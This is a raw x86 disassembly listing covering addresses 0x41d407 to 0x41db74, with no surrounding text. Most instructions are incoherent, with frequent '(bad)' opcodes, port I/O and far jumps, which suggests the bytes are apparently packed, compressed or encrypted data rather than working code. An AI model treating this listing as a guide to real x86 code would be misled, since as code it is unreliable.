  41d407:	idiv   BYTE PTR [edi-0x3b]
  41d40a:	mov    al,ds:0xd6c680aa
  41d40f:	lods   al,BYTE PTR ds:[esi]
  41d410:	aaa    
  41d411:	push   esp
  41d412:	test   al,0x10
  41d414:	(bad)  
  41d415:	lock dec ecx
  41d417:	mov    ch,0xb6
  41d419:	cs push esp
  41d41b:	aam    0xf
  41d41d:	retf   
  41d41e:	gs mov cl,0x93
  41d421:	test   BYTE PTR [edx-0x2b4eea5f],0x8a
  41d428:	mov    ?,WORD PTR [ecx]
  41d42a:	aaa    
  41d42b:	ret    0x5535
  41d42e:	jecxz  0x41d3ed
  41d430:	pop    ebx
  41d431:	pop    edi
  41d432:	and    esp,DWORD PTR [eax+edi*2-0x2562c5a5]
  41d439:	imul   ebp,edx,0x78
  41d43c:	mov    dh,0x41
  41d43e:	cwde   
  41d43f:	clc    
  41d440:	sbb    esp,DWORD PTR ds:0x44be01fd
  41d446:	dec    esi
  41d447:	xchg   ecx,eax
  41d448:	fs in  al,0xb2
  41d44b:	scas   al,BYTE PTR es:[edi]
  41d44c:	rcl    esi,cl
  41d44e:	mov    al,ds:0xe88c6687
  41d453:	and    BYTE PTR [esi-0x40],al
  41d456:	ins    DWORD PTR es:[di],dx
  41d458:	ins    DWORD PTR es:[edi],dx
  41d459:	sahf   
  41d45a:	sub    bl,cl
  41d45c:	outs   dx,DWORD PTR ds:[esi]
  41d45d:	adc    BYTE PTR [edi],ch
  41d45f:	cmp    al,0xd8
  41d461:	jge    0x41d4ae
  41d463:	shl    ch,cl
  41d465:	mov    cl,BYTE PTR [edi+0x6ca86913]
  41d46b:	mov    dh,BYTE PTR [edx-0x21]
  41d46e:	and    eax,0xafa6e432
  41d473:	arpl   WORD PTR es:[edi],cx
  41d476:	in     eax,dx
  41d477:	pop    ds
  41d478:	jbe    0x41d42e
  41d47a:	inc    ecx
  41d47b:	xchg   ebp,eax
  41d47c:	les    edi,FWORD PTR [esi+edx*1]
  41d47f:	in     al,0x88
  41d481:	push   es
  41d482:	pop    ebp
  41d483:	imul   edi,DWORD PTR [ecx+0x43751f60],0xaf1823ed
  41d48d:	(bad)  
  41d48e:	int3   
  41d48f:	pop    eax
  41d490:	mov    ds:0xac57c66e,eax
  41d495:	into   
  41d496:	ror    eax,1
  41d498:	retf   
  41d499:	call   0x5f64:0x6c8d5a41
  41d4a0:	scas   al,BYTE PTR es:[edi]
  41d4a1:	nop
  41d4a2:	ds pushf 
  41d4a4:	mov    dl,0x55
  41d4a6:	jns    0x41d4f9
  41d4a8:	sbb    eax,DWORD PTR [esi]
  41d4aa:	pop    ecx
  41d4ab:	sub    edx,DWORD PTR [eax+0x65]
  41d4ae:	jecxz  0x41d45c
  41d4b0:	mul    edx
  41d4b2:	mov    edi,gs
  41d4b4:	push   eax
  41d4b5:	or     eax,0xbe056409
  41d4ba:	imul   ecx,DWORD PTR [ebp-0xc],0x90abd2f6
  41d4c1:	mov    BYTE PTR ds:0x8f10f68c,al
  41d4c7:	clc    
  41d4c8:	mov    bl,0x9f
  41d4ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4cb:	(bad)  
  41d4cc:	cli    
  41d4cd:	imul   ebx,ebx,0xffffff9e
  41d4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4d1:	rol    BYTE PTR [edx+ebx*8+0x5c],cl
  41d4d5:	pusha  
  41d4d6:	mov    eax,0xfc83bdf4
  41d4db:	(bad)  
  41d4dc:	mov    esp,0xf083c95b
  41d4e1:	jecxz  0x41d4bb
  41d4e3:	adc    BYTE PTR [esi],al
  41d4e5:	inc    edi
  41d4e6:	(bad)  
  41d4e7:	jmp    0x41d543
  41d4e9:	fist   WORD PTR [ebx]
  41d4eb:	mov    WORD PTR [ebp-0x49cd9154],?
  41d4f1:	fiadd  DWORD PTR [edx+0x6a6102d5]
  41d4f7:	mov    eax,0xa12532f8
  41d4fc:	pop    ss
  41d4fd:	xchg   edi,eax
  41d4fe:	fidiv  WORD PTR [ebp+0x79428c94]
  41d504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d505:	pushw  0xb87e
  41d509:	pop    ebx
  41d50a:	xchg   DWORD PTR [edi-0x75093b90],ebp
  41d510:	mov    bh,0xf2
  41d512:	cmp    ebp,esp
  41d514:	into   
  41d515:	add    eax,0xfbe105f1
  41d51a:	bound  ebx,QWORD PTR [ebx-0x10]
  41d51d:	and    al,0xc1
  41d51f:	in     al,dx
  41d520:	mov    BYTE PTR [eax+0x13b6c72d],cl
  41d526:	mov    edi,0x44473006
  41d52b:	mov    ebp,0x902660fa
  41d530:	xchg   edx,eax
  41d531:	pop    edx
  41d532:	or     al,0xac
  41d534:	stos   BYTE PTR es:[edi],al
  41d535:	mov    al,0x13
  41d537:	jg     0x41d4bc
  41d539:	test   al,0xa4
  41d53b:	int3   
  41d53c:	xor    al,0x50
  41d53e:	in     eax,dx
  41d53f:	fild   WORD PTR [ebx-0x543613e6]
  41d545:	push   ds
  41d546:	xchg   BYTE PTR [edx+0x40],ch
  41d549:	mov    cl,bl
  41d54b:	push   edi
  41d54c:	dec    edi
  41d54d:	daa    
  41d54e:	mov    ah,bl
  41d550:	lock aas 
  41d552:	(bad)  
  41d553:	xlat   BYTE PTR ds:[ebx]
  41d554:	in     eax,dx
  41d555:	in     eax,dx
  41d556:	jmp    0x1036:0x73020ba6
  41d55d:	add    edx,DWORD PTR [ebx-0x124357d6]
  41d563:	adc    DWORD PTR [eax-0x1695e609],0x54
  41d56a:	mov    DWORD PTR [esi-0x24dd3c9d],ebp
  41d570:	mov    eax,0x354300dd
  41d575:	sbb    ch,dl
  41d577:	xchg   ebp,eax
  41d578:	jbe    0x41d5be
  41d57a:	xchg   BYTE PTR [edi+0x5d],cl
  41d57d:	cs stc 
  41d57f:	mov    eax,ds:0x332675ee
  41d584:	cmp    esp,DWORD PTR [edi]
  41d586:	ret    0x87ed
  41d589:	xor    ah,BYTE PTR [ebx]
  41d58b:	mov    ebx,0x89e07d97
  41d590:	std    
  41d591:	jl     0x41d5a4
  41d593:	push   edi
  41d594:	shl    edx,0x22
  41d597:	sbb    DWORD PTR [edi],eax
  41d599:	push   ds
  41d59a:	scas   al,BYTE PTR es:[edi]
  41d59b:	pusha  
  41d59c:	jnp    0x41d5f0
  41d59e:	adc    BYTE PTR [edx+0x26],ah
  41d5a1:	cld    
  41d5a2:	jle    0x41d573
  41d5a4:	scas   al,BYTE PTR es:[edi]
  41d5a5:	push   ss
  41d5a6:	mov    bh,0xbb
  41d5a8:	xor    eax,0xf17e7a65
  41d5ad:	stc    
  41d5ae:	ja     0x41d5d8
  41d5b0:	clc    
  41d5b1:	pop    esi
  41d5b2:	repz push DWORD PTR [esi-0x6b3a35e]
  41d5b9:	popa   
  41d5ba:	imul   edi,esi,0xffffff90
  41d5bd:	cld    
  41d5be:	test   al,0x79
  41d5c0:	fwait
  41d5c1:	adc    esp,DWORD PTR [ebp+esi*8+0x269bb45b]
  41d5c8:	push   esi
  41d5c9:	fabs   
  41d5cb:	mov    eax,ecx
  41d5cd:	repz aam 0x74
  41d5d0:	jecxz  0x41d575
  41d5d2:	(bad)  
  41d5d3:	mov    ah,0x3d
  41d5d5:	mov    bh,0x5
  41d5d7:	jno    0x41d563
  41d5d9:	sub    BYTE PTR [eax+0x57],cl
  41d5dc:	or     eax,0xab59f69a
  41d5e1:	xor    BYTE PTR [edx],bh
  41d5e3:	scas   al,BYTE PTR es:[edi]
  41d5e4:	sbb    ebx,DWORD PTR [eax+0x7a759dde]
  41d5ea:	or     BYTE PTR [eax],bl
  41d5ec:	out    0xb9,al
  41d5ee:	mov    esi,0xf6387a87
  41d5f3:	sub    cl,ch
  41d5f5:	jg     0x41d65b
  41d5f7:	mov    eax,ds:0xda90534a
  41d5fc:	adc    eax,esi
  41d5fe:	mov    ds,WORD PTR [ecx+0x75]
  41d601:	sahf   
  41d602:	test   DWORD PTR [ecx+0x44686796],0xd6663ef7
  41d60c:	loop   0x41d638
  41d60e:	xchg   esi,eax
  41d60f:	mov    WORD PTR [edx-0x62],ds
  41d612:	jmp    0x8a28:0xb7302abc
  41d619:	inc    edi
  41d61a:	sbb    DWORD PTR [ebx-0x4a],0x3f
  41d61e:	test   al,0x1b
  41d620:	jmp    DWORD PTR [esi+0x77]
  41d623:	add    al,0xc
  41d625:	xchg   ebp,eax
  41d626:	psubsw mm2,QWORD PTR [esi+0xd]
  41d62a:	pop    edi
  41d62b:	shr    BYTE PTR [edx],0x44
  41d62e:	repz xchg edx,eax
  41d630:	and    ah,bh
  41d632:	mov    dh,0x8a
  41d634:	add    BYTE PTR [esi-0x1c15bf3],ch
  41d63a:	outs   dx,BYTE PTR ds:[esi]
  41d63b:	cwde   
  41d63c:	xlat   BYTE PTR ds:[ebx]
  41d63d:	xor    DWORD PTR [edx-0x19],ebx
  41d640:	sub    edi,eax
  41d642:	push   ss
  41d643:	cld    
  41d644:	aad    0x6c
  41d646:	ss or  esi,ebx
  41d649:	cli    
  41d64a:	idiv   BYTE PTR [ebp-0xe16c10e]
  41d650:	or     edi,DWORD PTR [eax+0x27774a00]
  41d656:	lods   al,BYTE PTR ds:[esi]
  41d657:	or     edx,DWORD PTR [ecx+esi*1-0xddb6254]
  41d65e:	sub    al,0xfa
  41d660:	pop    ds
  41d661:	leave  
  41d662:	inc    ebx
  41d663:	(bad)  
  41d664:	js     0x41d6d3
  41d666:	sub    ebp,DWORD PTR [edx]
  41d668:	ror    DWORD PTR [eax-0x3b54d543],0xb6
  41d66f:	inc    ebp
  41d670:	fstp   TBYTE PTR cs:[edi-0x64]
  41d674:	and    eax,0xc291c5d8
  41d679:	adc    esp,edx
  41d67b:	push   ebx
  41d67c:	cdq    
  41d67d:	cli    
  41d67e:	push   eax
  41d67f:	mov    ebx,0xe4fd393d
  41d684:	cmp    esi,ecx
  41d686:	call   0xda15:0x455a1602
  41d68d:	cli    
  41d68e:	push   edx
  41d68f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d690:	push   ebx
  41d691:	mov    bl,0x79
  41d693:	repnz and DWORD PTR fs:0xbe23b152,0x7b
  41d69c:	mov    ds:0x1e5e805e,al
  41d6a1:	or     eax,ebp
  41d6a3:	pop    ebp
  41d6a4:	cmp    ebx,ebx
  41d6a6:	aas    
  41d6a7:	shl    BYTE PTR [ebx-0x34],0x2f
  41d6ab:	(bad)  
  41d6ad:	jp     0x41d6de
  41d6af:	lods   eax,DWORD PTR ds:[esi]
  41d6b0:	or     eax,0x4fc0cf86
  41d6b5:	jle    0x41d667
  41d6b7:	inc    ebp
  41d6b8:	out    dx,eax
  41d6b9:	pop    ds
  41d6ba:	ret    
  41d6bb:	pushf  
  41d6bc:	mov    bh,0x7d
  41d6be:	xchg   edi,eax
  41d6bf:	rol    BYTE PTR [ebp+0x756895f4],cl
  41d6c5:	icebp  
  41d6c6:	cmp    eax,0x7026fc00
  41d6cb:	jnp    0x41d650
  41d6cd:	(bad)  
  41d6cf:	(bad)  
  41d6d0:	lods   eax,DWORD PTR ds:[esi]
  41d6d1:	and    edi,ebp
  41d6d3:	(bad)  
  41d6d4:	jp     0x41d65b
  41d6d6:	adc    al,BYTE PTR [edi-0x6b]
  41d6d9:	push   edi
  41d6da:	shl    BYTE PTR [edx],1
  41d6dc:	add    esi,DWORD PTR [edx-0xc]
  41d6df:	pop    es
  41d6e0:	neg    BYTE PTR [ebp-0x57]
  41d6e3:	jb     0x41d6c7
  41d6e5:	push   ebp
  41d6e6:	adc    BYTE PTR cs:[ebx-0x7e],cl
  41d6ea:	cdq    
  41d6eb:	sar    DWORD PTR [edx-0x74],cl
  41d6ee:	mov    dl,0xc8
  41d6f0:	popf   
  41d6f1:	xor    eax,0x221f78d2
  41d6f6:	xchg   BYTE PTR [esi+edi*2+0x677fb655],ah
  41d6fd:	inc    eax
  41d6fe:	imul   edi,DWORD PTR [ecx-0x5b],0x18
  41d702:	lds    edi,FWORD PTR [eax-0x430237c4]
  41d708:	pop    ds
  41d709:	push   edx
  41d70a:	in     al,dx
  41d70b:	dec    esp
  41d70c:	inc    edx
  41d70d:	or     al,0x8d
  41d70f:	call   0x315847ec
  41d714:	stos   DWORD PTR es:[edi],eax
  41d715:	mov    esp,ebp
  41d717:	call   0x686dad72
  41d71c:	out    dx,al
  41d71d:	lahf   
  41d71e:	leave  
  41d71f:	out    0x9e,eax
  41d721:	imul   ebp,DWORD PTR [ebx-0x26],0x70
  41d725:	fsubr  QWORD PTR [edx]
  41d727:	add    al,0x54
  41d729:	mov    WORD PTR [edi-0xb824cf1],fs
  41d72f:	fsub   st(4),st
  41d731:	mov    eax,0x36e9fec4
  41d736:	fisttp WORD PTR [eax]
  41d738:	lahf   
  41d739:	jmp    0xa10d:0xbed54b21
  41d740:	into   
  41d741:	inc    ebp
  41d742:	jno    0x41d769
  41d744:	or     ah,bh
  41d746:	cwde   
  41d747:	push   edi
  41d748:	lahf   
  41d749:	sub    ah,dl
  41d74b:	mov    ch,0xeb
  41d74d:	ret    
  41d74e:	sar    DWORD PTR [esi-0x73fc0d24],cl
  41d754:	ins    BYTE PTR es:[edi],dx
  41d755:	inc    edi
  41d756:	out    dx,al
  41d757:	jle    0x41d799
  41d759:	mov    bl,0x2d
  41d75b:	outs   dx,DWORD PTR ds:[esi]
  41d75c:	dec    edx
  41d75d:	sbb    BYTE PTR [edi+0x4e],0x2f
  41d761:	dec    eax
  41d762:	enter  0xa865,0x85
  41d766:	jno    0x41d734
  41d768:	sbb    ebx,DWORD PTR [edx+0x4d75ca5]
  41d76e:	ds mov esp,0x33fafea9
  41d774:	jmp    0x41d73b
  41d776:	dec    ebx
  41d777:	dec    ebx
  41d778:	jno    0x41d7cf
  41d77a:	cmp    al,0x46
  41d77d:	iret   
  41d77e:	out    dx,eax
  41d77f:	cmp    dh,0xda
  41d782:	xor    eax,0xb9ed403f
  41d787:	push   ss
  41d788:	dec    esp
  41d789:	mov    WORD PTR [edi-0x3e187f2],gs
  41d78f:	in     al,dx
  41d790:	cld    
  41d791:	mov    esi,DWORD PTR [ecx-0x44]
  41d794:	in     al,dx
  41d795:	hlt    
  41d796:	test   al,0x47
  41d798:	mov    bh,0xf
  41d79a:	jbe    0x41d744
  41d79c:	inc    eax
  41d79d:	fsubr  QWORD PTR [eax-0x53]
  41d7a0:	add    eax,0x9943382e
  41d7a5:	mov    ebx,0xa7b1c1bd
  41d7aa:	das    
  41d7ab:	mov    BYTE PTR [ebx],bh
  41d7ad:	repz jecxz 0x41d788
  41d7b0:	xchg   edi,eax
  41d7b1:	aas    
  41d7b2:	push   ebp
  41d7b3:	xchg   edi,eax
  41d7b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7b5:	inc    ebp
  41d7b6:	add    DWORD PTR [ecx-0x68],0x4
  41d7ba:	inc    edi
  41d7bb:	jne    0x41d787
  41d7bd:	dec    edi
  41d7be:	sbb    ecx,ebx
  41d7c0:	jne    0x41d77a
  41d7c2:	xlat   BYTE PTR ds:[ebx]
  41d7c3:	dec    ebp
  41d7c4:	fwait
  41d7c5:	adc    esi,edx
  41d7c7:	lods   al,BYTE PTR ds:[esi]
  41d7c8:	push   ebx
  41d7c9:	imul   edx,DWORD PTR [eax],0x4fdd8406
  41d7cf:	add    BYTE PTR [edi+eax*1+0x1acd451b],ch
  41d7d6:	fs mov bl,0xef
  41d7d9:	push   edx
  41d7da:	push   edi
  41d7db:	stc    
  41d7dc:	cmp    ebp,DWORD PTR [edx+0x3f]
  41d7df:	cmp    eax,0x6b21a48a
  41d7e4:	enter  0x1293,0xa
  41d7e8:	inc    eax
  41d7e9:	and    bh,BYTE PTR [edi]
  41d7eb:	push   0x25
  41d7ed:	cmp    dl,BYTE PTR [ebx+0xd]
  41d7f0:	fsub   DWORD PTR [ebp+0x612598ec]
  41d7f6:	out    0x27,eax
  41d7f8:	dec    edi
  41d7f9:	mov    ch,0x2
  41d7fb:	repz test DWORD PTR [ebx],ebx
  41d7fe:	and    BYTE PTR [ecx],al
  41d800:	jecxz  0x41d78e
  41d802:	push   esi
  41d803:	jg     0x41d7e3
  41d805:	inc    ebx
  41d806:	mov    ebp,0x15427601
  41d80b:	and    ecx,0xb35c6398
  41d811:	arpl   WORD PTR [edx-0x4e37451],bp
  41d817:	jmp    0x41d853
  41d819:	les    edx,FWORD PTR [eax-0x62]
  41d81c:	jo     0x41d80a
  41d81e:	leave  
  41d81f:	cli    
  41d820:	or     eax,0x7e7f3e07
  41d825:	mov    edx,0x3e2aa4c
  41d82a:	imul   edx,DWORD PTR [ebx-0x19],0x39d46e7e
  41d831:	shr    BYTE PTR [ebx],1
  41d833:	jmp    0x41d886
  41d835:	retf   0xfc4c
  41d838:	fcmovnb st,st(4)
  41d83a:	aad    0x6e
  41d83c:	xchg   ebp,eax
  41d83d:	in     al,0x52
  41d83f:	mov    bl,0xfd
  41d841:	add    al,0x3f
  41d843:	call   0xe0ca:0x72af0e4c
  41d84a:	clc    
  41d84b:	cli    
  41d84c:	fwait
  41d84d:	mov    ah,0x81
  41d84f:	sub    esi,DWORD PTR [esi-0x57b2764c]
  41d855:	mov    ecx,DWORD PTR [ebp+0x8]
  41d858:	mov    edx,DWORD PTR [ebp-0x54]
  41d85b:	add    ecx,0x64f898
  41d861:	jmp    0x41fbc0
  41d866:	popf   
  41d867:	add    eax,0xa840804
  41d86c:	xchg   ecx,eax
  41d86d:	adc    bl,0x9b
  41d870:	pop    eax
  41d871:	in     al,dx
  41d872:	mov    dh,0xaa
  41d875:	jnp    0x41d826
  41d877:	fstp   TBYTE PTR [ebx+eax*4+0x3d]
  41d87b:	pop    esi
  41d87c:	add    DWORD PTR [ebx-0x71803248],0xffffffe2
  41d883:	xlat   BYTE PTR ds:[ebx]
  41d884:	call   0xff2f15b7
  41d889:	div    BYTE PTR [esp+ebx*1+0x15]
  41d88d:	lahf   
  41d88e:	add    eax,0x704d113e
  41d893:	sub    ch,ah
  41d895:	pop    ecx
  41d896:	jp     0x41d8cb
  41d898:	aad    0xeb
  41d89a:	xchg   edi,eax
  41d89b:	aad    0x1c
  41d89d:	push   ebp
  41d89e:	dec    eax
  41d89f:	and    al,0xd5
  41d8a1:	cmp    al,0x92
  41d8a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8a4:	ficom  WORD PTR [ebx+eax*8-0x7a]
  41d8a8:	mov    ecx,0x2b4c4d8b
  41d8ad:	inc    edx
  41d8ae:	fadd   st,st(6)
  41d8b0:	push   edx
  41d8b1:	psrlq  mm6,QWORD PTR [ecx-0x1e]
  41d8b5:	jo     0x41d907
  41d8b7:	outs   dx,BYTE PTR ds:[esi]
  41d8b8:	call   0x7056:0x9f2fe834
  41d8bf:	inc    ecx
  41d8c0:	lods   al,BYTE PTR ds:[esi]
  41d8c1:	cdq    
  41d8c2:	jp     0x41d86e
  41d8c4:	(bad)  
  41d8c5:	ficomp WORD PTR [eax]
  41d8c7:	sub    bh,bl
  41d8c9:	nop
  41d8ca:	das    
  41d8cb:	dec    ebx
  41d8cc:	jle    0x41d8c8
  41d8ce:	fwait
  41d8cf:	xchg   esp,eax
  41d8d0:	cmp    DWORD PTR [esi],edx
  41d8d2:	ret    
  41d8d3:	adc    DWORD PTR [ebp+0x41],ebp
  41d8d6:	bt     DWORD PTR [ebx],edi
  41d8d9:	xchg   DWORD PTR [eax-0x7668ba07],ebx
  41d8df:	cmc    
  41d8e0:	mov    eax,ds:0x8f65f3ff
  41d8e5:	std    
  41d8e6:	cwde   
  41d8e7:	adc    bl,BYTE PTR [ecx]
  41d8e9:	es push edi
  41d8eb:	fldcw  WORD PTR [esi-0x6661ac72]
  41d8f1:	aas    
  41d8f2:	mov    ecx,0xcb1343e6
  41d8f7:	jo     0x41d8bc
  41d8f9:	cwde   
  41d8fa:	ins    BYTE PTR es:[edi],dx
  41d8fb:	dec    ebp
  41d8fc:	adc    eax,0xb819de37
  41d901:	fwait
  41d902:	lahf   
  41d903:	popf   
  41d904:	loopne 0x41d91d
  41d906:	cmp    eax,0x8e2635b7
  41d90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d90c:	mov    dh,0xc0
  41d90e:	stos   BYTE PTR es:[edi],al
  41d90f:	mov    dh,0x1f
  41d911:	jge    0x41d96c
  41d913:	aad    0x8e
  41d915:	fwait
  41d916:	and    BYTE PTR [ebx-0x2950c69d],dl
  41d91c:	jp     0x41d922
  41d91e:	mov    bl,0xb0
  41d920:	cdq    
  41d921:	or     al,0x7c
  41d923:	add    BYTE PTR [ebp+eiz*1-0x4af1dbed],0x2
  41d92b:	or     ecx,DWORD PTR [esi+eax*2]
  41d92e:	sbb    al,0x57
  41d930:	xor    al,0xc
  41d932:	inc    ebx
  41d933:	ds ss js 0x41d8c9
  41d937:	inc    ebx
  41d938:	mov    edi,0x8921893c
  41d93d:	sub    al,0x10
  41d93f:	sub    bh,al
  41d941:	mov    ebx,?
  41d943:	mov    eax,ds:0xdff63e99
  41d948:	xor    al,0x87
  41d94a:	in     al,0x41
  41d94c:	mov    edx,0x51c70fbf
  41d951:	pop    ss
  41d952:	sbb    dh,al
  41d954:	fisub  DWORD PTR ds:0x8a761936
  41d95a:	jnp    0x41d92c
  41d95c:	push   ebp
  41d95d:	mov    cl,0xc4
  41d95f:	jl     0x41d994
  41d961:	inc    eax
  41d962:	push   esi
  41d963:	iret   
  41d964:	addr16 loopne 0x41d966
  41d967:	xlat   BYTE PTR ds:[ebx]
  41d968:	mov    cl,0xd2
  41d96a:	and    al,0xa5
  41d96c:	mov    edi,0xd187085a
  41d971:	sub    edi,ecx
  41d973:	mov    BYTE PTR [ecx+0xd],dl
  41d976:	add    BYTE PTR [ebx-0x2c],ch
  41d979:	adc    BYTE PTR [ebp-0x30],al
  41d97c:	bound  eax,QWORD PTR [ebx-0x3ee6afe]
  41d982:	mov    edx,0x869f6957
  41d987:	and    ebx,DWORD PTR [edx]
  41d989:	adc    eax,0x2e70e3b7
  41d98e:	bound  eax,QWORD PTR ds:0x70b5dfa3
  41d994:	fbld   TBYTE PTR [edi+ebp*8-0x52]
  41d998:	loope  0x41d9ad
  41d99a:	(bad)  
  41d99b:	xchg   edi,eax
  41d99c:	repz xchg edi,eax
  41d99e:	mov    BYTE PTR [ebp+ebx*8+0x40],ah
  41d9a2:	xor    dh,dl
  41d9a4:	outs   dx,DWORD PTR ds:[esi]
  41d9a5:	ss mov al,0xfe
  41d9a8:	jnp    0x41d9c8
  41d9aa:	adc    eax,0x6432218d
  41d9af:	ror    DWORD PTR [ecx-0x7bfd1959],cl
  41d9b5:	imul   edi,DWORD PTR ds:[esi-0x62],0x51
  41d9ba:	mov    edx,0x20a44bbb
  41d9bf:	out    0x27,al
  41d9c1:	icebp  
  41d9c2:	pop    eax
  41d9c3:	fdiv   QWORD PTR [esi+0x30b16a3f]
  41d9c9:	dec    ebx
  41d9ca:	or     bh,bl
  41d9cc:	jl     0x41d962
  41d9ce:	xchg   edx,eax
  41d9cf:	pop    ebp
  41d9d0:	xchg   DWORD PTR [edx+ebp*4],esi
  41d9d3:	inc    esp
  41d9d4:	push   0xf4737407
  41d9d9:	rcl    ebp,0x65
  41d9dc:	xchg   esi,eax
  41d9dd:	addr16 adc ah,0x84
  41d9e1:	and    eax,0x834710c7
  41d9e6:	stc    
  41d9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9e9:	aam    0x92
  41d9eb:	stos   BYTE PTR es:[edi],al
  41d9ec:	add    al,0x6b
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	cmp    ecx,DWORD PTR [ebx+0x9]
  41d9f2:	push   ds
  41d9f3:	xchg   edi,eax
  41d9f4:	add    BYTE PTR [esi],0x31
  41d9f7:	or     edx,DWORD PTR [ebx]
  41d9f9:	or     BYTE PTR [ebx],cl
  41d9fb:	pop    edi
  41d9fc:	push   edi
  41d9fd:	test   al,0xb1
  41d9ff:	out    dx,eax
  41da00:	aas    
  41da01:	daa    
  41da02:	mov    bh,0xac
  41da04:	repnz fsub QWORD PTR [ebp-0x1d1a2f13]
  41da0b:	pusha  
  41da0c:	jl     0x41d99b
  41da0e:	popa   
  41da0f:	into   
  41da10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da11:	(bad)  
  41da12:	dec    edi
  41da13:	push   cs
  41da14:	pop    es
  41da15:	mov    esp,0x4a87a940
  41da1a:	fbld   TBYTE PTR ds:0xc2901d0d
  41da20:	in     al,0x5
  41da22:	sahf   
  41da23:	leave  
  41da24:	jns    0x41da26
  41da26:	js     0x41da11
  41da28:	jmp    0x41da65
  41da2a:	cmp    ebp,DWORD PTR [edx]
  41da2c:	(bad)  
  41da2d:	dec    ebx
  41da2e:	fimul  DWORD PTR [ecx-0x3c57abcc]
  41da34:	mov    edi,0x63c41c83
  41da39:	xchg   ebx,eax
  41da3a:	addr16 mov al,ds:0x971d
  41da3e:	imul   ebx,DWORD PTR [edx+0x3e5ae0af],0x3a67d431
  41da48:	xlat   BYTE PTR ds:[ebx]
  41da49:	add    bh,BYTE PTR [edi+eiz*1+0x52b66419]
  41da50:	data16 stc 
  41da52:	rcr    edi,cl
  41da54:	xchg   ecx,ebx
  41da56:	das    
  41da57:	lods   eax,DWORD PTR ds:[esi]
  41da58:	fs enter 0xa4e,0xc6
  41da5d:	push   ds
  41da5e:	mov    bl,0x7c
  41da60:	mov    al,ds:0x82ec1246
  41da65:	sti    
  41da66:	mov    WORD PTR [ebp+0x9b71cdd],es
  41da6c:	icebp  
  41da6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da6e:	arpl   dx,cx
  41da70:	mov    cl,0x59
  41da72:	xchg   esp,eax
  41da73:	inc    ecx
  41da74:	(bad)  
  41da75:	mov    ds,WORD PTR [edx-0x55bf05e4]
  41da7b:	pop    esp
  41da7c:	jno    0x41daa4
  41da7e:	adc    eax,0x485daa31
  41da83:	xchg   ah,ah
  41da85:	cmp    bh,BYTE PTR [eax-0xc]
  41da88:	xor    DWORD PTR [esi-0x43a40686],ebx
  41da8e:	mov    esi,0x86cebcc2
  41da93:	mov    esi,0xaa59cc4e
  41da98:	adc    ebx,ecx
  41da9a:	nop
  41da9b:	fadd   QWORD PTR [ecx]
  41da9d:	enter  0x459b,0x3a
  41daa1:	lea    esp,[esi+0x4c92d749]
  41daa7:	jns    0x41dae4
  41daa9:	adc    edx,DWORD PTR [esi-0x1c]
  41daac:	(bad)  
  41daae:	push   0xffffffd2
  41dab0:	in     al,dx
  41dab1:	xor    eax,0xa04c0f7d
  41dab6:	inc    edx
  41dab7:	inc    ebx
  41dab8:	cwde   
  41dab9:	xor    edi,DWORD PTR [eax-0x28]
  41dabc:	xor    eax,0xea03652a
  41dac1:	lea    ecx,[edx+0x43ce132b]
  41dac7:	aad    0xa7
  41dac9:	outs   dx,DWORD PTR fs:[esi]
  41dacb:	xchg   esp,eax
  41dacc:	das    
  41dacd:	iret   
  41dace:	mov    dl,0xb8
  41dad0:	outs   dx,BYTE PTR ds:[esi]
  41dad1:	jmp    0x9dbd:0xc326f054
  41dad8:	xor    eax,esp
  41dada:	xchg   DWORD PTR ds:0x9b562f36,esi
  41dae0:	add    al,0xd8
  41dae2:	lods   eax,DWORD PTR ds:[esi]
  41dae3:	int3   
  41dae4:	test   al,0x82
  41dae6:	jns    0x41db2f
  41dae8:	jmp    0x1015b037
  41daed:	push   esi
  41daee:	xchg   ecx,eax
  41daef:	pop    edi
  41daf0:	push   ebx
  41daf1:	cmp    cl,cl
  41daf3:	sub    BYTE PTR [edx-0x2c],bl
  41daf6:	add    al,0x4b
  41daf8:	pop    es
  41daf9:	in     eax,0x94
  41dafb:	outs   dx,BYTE PTR ds:[esi]
  41dafc:	jo     0x41db0b
  41dafe:	cmc    
  41daff:	and    eax,0x7daa11d5
  41db04:	in     al,dx
  41db05:	stos   DWORD PTR es:[edi],eax
  41db06:	cwde   
  41db07:	and    ah,BYTE PTR [edx]
  41db09:	fstp   TBYTE PTR [eax]
  41db0b:	mov    ds:0x6084569b,eax
  41db10:	inc    esp
  41db11:	cld    
  41db12:	loop   0x41db4c
  41db14:	(bad)
  41db18:	ss aaa 
  41db1a:	rcr    cl,1
  41db1c:	sub    ah,BYTE PTR [edi-0x3752723c]
  41db22:	mov    eax,ds:0x95eb7b4
  41db27:	in     eax,dx
  41db28:	scas   eax,DWORD PTR es:[edi]
  41db29:	push   edx
  41db2a:	repz call 0xf11:0x459be7ec
  41db32:	xor    eax,0x79dcacae
  41db37:	cwde   
  41db38:	mov    DWORD PTR [eax-0x3f],ebx
  41db3b:	aad    0xf7
  41db3d:	or     al,0xf6
  41db3f:	push   ebp
  41db40:	and    al,0x5c
  41db42:	clc    
  41db43:	push   cs
  41db44:	push   es
  41db45:	sbb    BYTE PTR [eax-0x2dd0940e],cl
  41db4b:	jbe    0x41db80
  41db4d:	fnstenv [ecx-0x30ba31da]
  41db53:	and    BYTE PTR [edi],dl
  41db55:	dec    ebx
  41db56:	push   es
  41db57:	mov    edx,0x8d894a0
  41db5c:	dec    esp
  41db5d:	cmc    
  41db5e:	cmp    DWORD PTR [ecx+0x6dfab6a4],esi
  41db64:	mov    eax,0x360c2d2e
  41db69:	ret    
  41db6a:	jne    0x41dbe5
  41db6c:	inc    ebp
  41db6d:	xlat   BYTE PTR ds:[ebx]
  41db6e:	stos   DWORD PTR es:[edi],eax
  41db6f:	fs lock outs dx,BYTE PTR es:[esi]
  41db73:	cld    
  41db74:	ins    BYTE PTR es:[edi],dx
